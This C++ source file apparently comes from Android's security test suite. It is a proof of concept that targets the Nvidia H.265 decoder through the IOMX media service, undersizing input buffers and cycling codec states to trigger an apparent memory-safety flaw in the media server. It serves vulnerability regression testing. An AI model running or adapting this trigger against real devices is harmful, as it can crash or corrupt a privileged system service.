/**
 * Copyright (C) 2019 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions vand
 * limitations under the License.
 */

#include <OMX_Component.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryDealer.h>
#include <fcntl.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

using namespace android;

// original poc was missing FuzzOption
struct FuzzOption {
  bool readFromFile;
  char *inputFileName;
  int sleep;
};

class DummyOMXObserver : public BnOMXObserver {
 public:
  DummyOMXObserver() {}
  virtual void onMessages(const std::list<omx_message> &) {}

 protected:
  virtual ~DummyOMXObserver() {}
};

template <class T>
static void InitOMXParams(T *params) {
  memset(params, 0, sizeof(T));
  params->nSize = sizeof(T);
  params->nVersion.s.nVersionMajor = 1;
  params->nVersion.s.nVersionMinor = 0;
  params->nVersion.s.nRevision = 0;
  params->nVersion.s.nStep = 0;
}

static bool connectOMX(sp<IOMX> &omx) {
  sp<IServiceManager> sm = defaultServiceManager();
  sp<IBinder> binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> mediaPlayerService =
      interface_cast<IMediaPlayerService>(binder);

  if (mediaPlayerService == NULL) {
    ALOGE("NULL media player service");
    return false;
  }

  omx = mediaPlayerService->getOMX();
  if (omx == NULL) {
    ALOGE("Failed getting OMX");
    return false;
  }
  return true;
}

static bool fuzzIOMXCodec(const char *codecName, FuzzOption *fuzzOption) {
  ALOGI("fuzzIOMXCodec: %s", codecName);

  // connect to IOMX each time
  sp<IOMX> service;
  if (connectOMX(service) == false) {
    return false;
  }

  IOMX::node_id node = 0;
  int fenceFd = -1;

  sp<DummyOMXObserver> observer = new DummyOMXObserver();

  status_t err = service->allocateNode(codecName, observer, nullptr, &node);
  if (err != OK) {
    ALOGI("%s node allocation fails", codecName);
    return false;
  }

  int inMemSize = 0;
  int inBufferCnt = 0;
  int outMemSize = 0;
  int outBufferCnt = 0;

  OMX_PARAM_PORTDEFINITIONTYPE def;
  InitOMXParams(&def);

  // input port
  def.nPortIndex = 0;
  err = service->getParameter(node, OMX_IndexParamPortDefinition, &def,
                              sizeof(def));
  ALOGI("port 0: %u buffers of size %u", def.nBufferCountActual,
        def.nBufferSize);
  inMemSize = def.nBufferCountActual * def.nBufferSize / 2;
  inBufferCnt = def.nBufferCountActual;

  // output port
  def.nPortIndex = 1;
  err = service->getParameter(node, OMX_IndexParamPortDefinition, &def,
                              sizeof(def));
  ALOGI("port 1: %u buffers of size %u", def.nBufferCountActual,
        def.nBufferSize);
  outMemSize = def.nBufferCountActual * def.nBufferSize;
  outBufferCnt = def.nBufferCountActual;

  int inBufferSize = inMemSize / inBufferCnt;
  int outBufferSize = outMemSize / outBufferCnt;

  sp<MemoryDealer> dealerIn = new MemoryDealer(inMemSize);
  sp<MemoryDealer> dealerOut = new MemoryDealer(outMemSize);

  IOMX::buffer_id *inBufferId = new IOMX::buffer_id[inBufferCnt];
  IOMX::buffer_id *outBufferId = new IOMX::buffer_id[outBufferCnt];

  int inputFileFd = -1;
  if (fuzzOption->readFromFile) {
    inputFileFd = open(fuzzOption->inputFileName, O_RDONLY);
    if (inputFileFd < 0) {
      ALOGI("cannot open file: %s", fuzzOption->inputFileName);
      return false;
    }
  }
  for (int i = 0; i < inBufferCnt; i++) {
    sp<IMemory> memory = dealerIn->allocate(inBufferSize);
    if (memory == NULL || memory->pointer() == NULL) {
      ALOGE("cannot allocate input buffers: %d bytes from %d bytes",
            inBufferSize, inMemSize);
      return false;
    }

    memset(memory->pointer(), 0, inBufferSize);

    err = service->useBuffer(node, 0, memory, &inBufferId[i],
                             inBufferSize /*allottedSize*/);
    ALOGI("useBuffer, port index 0, err: %d", err);
  }

  for (int i = 0; i < outBufferCnt; i++) {
    sp<IMemory> memory = dealerOut->allocate(outBufferSize);
    if (memory == NULL || memory->pointer() == NULL) {
      ALOGE("cannot allocate output buffers: %d bytes from %d", outBufferSize,
            outMemSize);
      return false;
    }
    memset(memory->pointer(), 0xCF, outBufferSize);
    err = service->useBuffer(node, 1, memory, &outBufferId[i], outBufferSize);
    ALOGI("useBuffer, port index 1, err: %d", err);
  }

  sleep(fuzzOption->sleep);

  // change state from loaded to idle
  err = service->sendCommand(node, OMX_CommandStateSet, 2);
  ALOGI("sendCommand, err: %d", err);

  // change state from idle to executing
  err = service->sendCommand(node, OMX_CommandStateSet, 3);
  ALOGI("sendCommand, err: %d", err);

  sleep(fuzzOption->sleep);

  for (int i = 0; i < inBufferCnt; i++) {
    err = service->emptyBuffer(node, inBufferId[i], 0, inBufferSize, 0, 0,
                               fenceFd);
    ALOGI("emptyBuffer, err: %d", err);
  }

  for (int i = 0; i < outBufferCnt; i++) {
    err = service->fillBuffer(node, outBufferId[i], fenceFd);
    ALOGI("fillBuffer, err: %d", err);
  }

  sleep(fuzzOption->sleep);

  err = service->freeNode(node);
  ALOGI("freeNode, err: %d", err);

  return true;
}

int main() {
  sp<IOMX> omx;
  if (connectOMX(omx) == false) {
    return EXIT_FAILURE;
  }

  List<IOMX::ComponentInfo> list;

  status_t err = omx->listNodes(&list);
  if (err != OK) {
    ALOGE("cannot list codec nodes: %d", err);
    return EXIT_FAILURE;
  }

  if (list.size() == 0) {
    ALOGE("codec list is empty");
    return EXIT_FAILURE;
  }

  FuzzOption fuzzOption = {};

  for (List<IOMX::ComponentInfo>::iterator it = list.begin(); it != list.end();
       ++it) {
    const char * codecName = (*it).mName.string();

    if (codecName == NULL) {
      ALOGE("Empty codec name");
      return EXIT_FAILURE;
    }

    const char * nvdiaCodecName = "OMX.Nvidia.h265.decode";
    if (strcmp(codecName, nvdiaCodecName)) {
      continue;
    }

    fuzzOption.sleep = 2;
    if (!fuzzIOMXCodec(codecName, &fuzzOption)) {
      ALOGE("Failed in codec");
      return EXIT_FAILURE;
    }
  }

  return EXIT_SUCCESS;
}